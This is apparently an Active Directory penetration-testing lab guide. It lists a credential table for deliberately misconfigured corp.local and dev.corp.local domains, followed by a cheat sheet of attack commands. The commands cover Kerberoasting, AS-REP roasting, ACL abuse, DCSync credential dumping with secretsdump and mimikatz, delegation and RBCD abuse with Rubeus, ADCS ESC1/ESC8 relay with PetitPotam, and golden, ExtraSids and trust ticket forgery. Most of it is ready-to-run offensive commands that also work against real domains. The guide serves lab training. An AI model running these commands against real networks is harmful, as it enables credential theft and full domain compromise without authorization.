# Attack Paths & Full Credentials

> **Legal Notice:** This document is for authorized lab use only.

---

## Full Credentials

### corp.local

| Username        | Password  | Role                        | Notes                          |
|-----------------|-----------|-----------------------------|-------------------------------|
| Administrator   | p@ssw0rd  | Domain Admin                |                               |
| admin1          | p@ssw0rd  | Domain Admin                |                               |
| attacker.01     | p@ssw0rd  | Low-priv user               | **Starting point**            |
| ahmad.ali       | p@ssw0rd  | IT Admin                    | Member: IT Admins             |
| fahad.salem     | p@ssw0rd  | Helpdesk Lead               | ForceChangePassword over faisal|
| khalid.nasser   | p@ssw0rd  | IT Ops                      |                               |
| noura.ahmed     | p@ssw0rd  | IT                          | GenericAll over faisal.omar   |
| sara.khalid     | p@ssw0rd  | HR Manager                  |                               |
| maryam.hassan   | p@ssw0rd  | HR                          |                               |
| faisal.omar     | p@ssw0rd  | Finance Director            |                               |
| dana.rashid     | p@ssw0rd  | Finance                     |                               |
| walid.saeed     | p@ssw0rd  | Finance Analyst             | **AS-REP Roastable**          |
| tariq.dev       | p@ssw0rd  | Dev                         | WriteOwner over WEB-SRV-02    |
| omar.coder      | p@ssw0rd  | Dev                         | Shadow Credentials -> WEB-SRV-01 |
| lina.script     | p@ssw0rd  | Dev                         | **AS-REP Roastable**          |
| nasser.web      | p@ssw0rd  | Dev                         |                               |
| hamad.ceo       | p@ssw0rd  | Management / CEO            |                               |
| abdulaziz.cfo   | p@ssw0rd  | Management / CFO            |                               |
| contractor.mutaeb | p@ssw0rd| Staging / Contractor        | **AS-REP Roastable**          |
| svc_sql         | p@ssw0rd  | Service Account             | **Kerberoastable** (SPN set)  |
| svc_iis         | p@ssw0rd  | Service Account             | **Kerberoastable**            |
| svc_mssql       | p@ssw0rd  | Service Account             | **Kerberoastable**            |
| svc_exchange    | p@ssw0rd  | Service Account             | **Kerberoastable**            |
| svc_web         | p@ssw0rd  | Service Account             | **Kerberoastable** (Unconstrained Deleg.) |
| svc_backup      | p@ssw0rd  | Service Account             | **Kerberoastable** + DCSync   |

### dev.corp.local

| Username        | Password  | Role                        | Notes                          |
|-----------------|-----------|-----------------------------|-------------------------------|
| Administrator   | p@ssw0rd  | Child Domain Admin          |                               |
| faris.admin     | p@ssw0rd  | Child Domain Admin          |                               |
| sultan.ops      | p@ssw0rd  | IT Ops                      |                               |
| bader.dev       | p@ssw0rd  | Developer                   |                               |
| majed.asrep     | p@ssw0rd  | User                        | **AS-REP Roastable**          |
| svc_dev_sql     | p@ssw0rd  | Service Account             | **Kerberoastable**            |
| dev.backdoor    | p@ssw0rd  | Backdoor account            | SID History demo              |
| attacker.dev    | p@ssw0rd  | Low-priv user               | **Child domain starting point**|

---

## Attack Path Cheat Sheet

### 1. Domain Enumeration

```powershell
# BloodHound collection (run on WS-01)
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\loot\

# PowerView enumeration
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
Get-DomainTrust
```

### 2. Kerberoasting

```powershell
# PowerView
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName

# Rubeus
.\Rubeus.exe kerberoast /nowrap /format:hashcat

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

Targets: `svc_sql`, `svc_iis`, `svc_mssql`, `svc_exchange`, `svc_web`, `svc_backup`

### 3. AS-REP Roasting

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName

# Rubeus
.\Rubeus.exe asreproast /nowrap /format:hashcat

# Impacket (Linux)
GetNPUsers.py corp.local/ -usersfile lab-users.txt -dc-ip 192.168.56.10

# Crack
hashcat -m 18200 hashes.txt rockyou.txt
```

Targets: `walid.saeed`, `lina.script`, `contractor.mutaeb`, `majed.asrep`

### 4. ACL — GenericAll

```powershell
# noura.ahmed has GenericAll over faisal.omar
# -> Reset faisal's password

$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
Set-DomainUserPassword -Identity faisal.omar -AccountPassword $pass -Credential $cred
```

### 5. ACL — ForceChangePassword

```powershell
# fahad.salem has ForceChangePassword over faisal.omar
$newpass = ConvertTo-SecureString "Pwned123!" -AsPlainText -Force
Set-DomainUserPassword -Identity faisal.omar -AccountPassword $newpass
```

### 6. ACL — DCSync Rights

```powershell
# svc_backup has DCSync rights
# From Linux:
secretsdump.py corp/svc_backup:p@ssw0rd@192.168.56.10

# Mimikatz:
lsadump::dcsync /domain:corp.local /user:Administrator
```

### 7. Unconstrained Delegation

```powershell
# Find computers/users with unconstrained delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth

# WEB-SRV-01 and svc_web have unconstrained delegation
# Wait for DA to authenticate -> capture TGT
.\Rubeus.exe monitor /interval:1 /filteruser:Administrator
# Then: pass the TGT
.\Rubeus.exe ptt /ticket:<base64>
```

### 8. Constrained Delegation (KCD)

```powershell
# svc_iis can delegate to CIFS/DC-01
# Get a TGT for svc_iis, then S4U2Self + S4U2Proxy
.\Rubeus.exe s4u /user:svc_iis /password:p@ssw0rd /impersonateuser:Administrator /msdsspn:"CIFS/DC-01.corp.local" /nowrap
```

### 9. RBCD — Resource-Based Constrained Delegation

```powershell
# tariq.dev has WriteOwner over WEB-SRV-02
# 1. Take ownership of WEB-SRV-02
Set-DomainObjectOwner -Identity WEB-SRV-02 -OwnerIdentity tariq.dev
# 2. Add GenericAll to ourselves
Add-DomainObjectAcl -TargetIdentity WEB-SRV-02 -PrincipalIdentity tariq.dev -Rights All
# 3. Set msDS-AllowedToActOnBehalfOfOtherIdentity
$AttackerSID = (Get-DomainUser attacker.01).objectsid
Set-DomainObject -Identity WEB-SRV-02 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$AttackerSID}
# 4. S4U attack
.\Rubeus.exe s4u /user:attacker.01 /password:p@ssw0rd /impersonateuser:Administrator /msdsspn:"CIFS/WEB-SRV-02" /nowrap
```

### 10. ADCS — ESC1 (Enrollee Supplies SAN)

```powershell
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request cert as Administrator
.\Certify.exe request /ca:"DC-01\corp-DC-01-CA" /template:ESC1-LabAltName /altname:Administrator

# Convert and use
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:'' /nowrap
```

### 11. ADCS — ESC8 (NTLM Relay to Web Enrollment)

```powershell
# From Linux attacker
# 1. Start relay to ADCS web enrollment
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp -smb2support --adcs

# 2. Coerce authentication from DC-01 using PetitPotam
PetitPotam.py 192.168.56.30 192.168.56.10

# 3. Get base64 certificate, use with Rubeus
.\Rubeus.exe asktgt /user:DC-01$ /certificate:<base64> /nowrap
```

### 12. Golden Ticket

```powershell
# After dumping krbtgt hash via DCSync:
# mimikatz:
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXX /krbtgt:HASH /ptt
```

### 13. Child-to-Parent (ExtraSids)

```powershell
# 1. Get krbtgt hash of dev.corp.local
lsadump::dcsync /domain:dev.corp.local /user:krbtgt

# 2. Get Enterprise Admins SID
Get-DomainGroup -Domain corp.local -Identity "Enterprise Admins" | Select-Object ObjectSid

# 3. Forge golden ticket with ExtraSids
kerberos::golden /user:Administrator /domain:dev.corp.local /sid:S-1-5-21-DEV-SID /sids:S-1-5-21-CORP-SID-519 /krbtgt:DEV-KRBTGT-HASH /ptt

# 4. Access parent domain
ls \\DC-01.corp.local\C$
```

### 14. Trust Ticket

```powershell
# Get trust key (inter-realm shared secret)
lsadump::trust /patch

# Forge trust ticket
kerberos::golden /user:Administrator /domain:dev.corp.local /sid:S-1-5-21-DEV-SID /sids:S-1-5-21-CORP-SID-519 /rc4:TRUST-KEY-HASH /service:krbtgt /target:corp.local /ptt
```

---

## BloodHound Quick Queries

```cypher
-- Find all Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

-- Find shortest path to Domain Admins
MATCH (n),(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),p=shortestPath((n)-[*1..]->(m))
WHERE NOT n=m RETURN p

-- Find users with DCSync rights
MATCH p=(n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN p

-- Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```
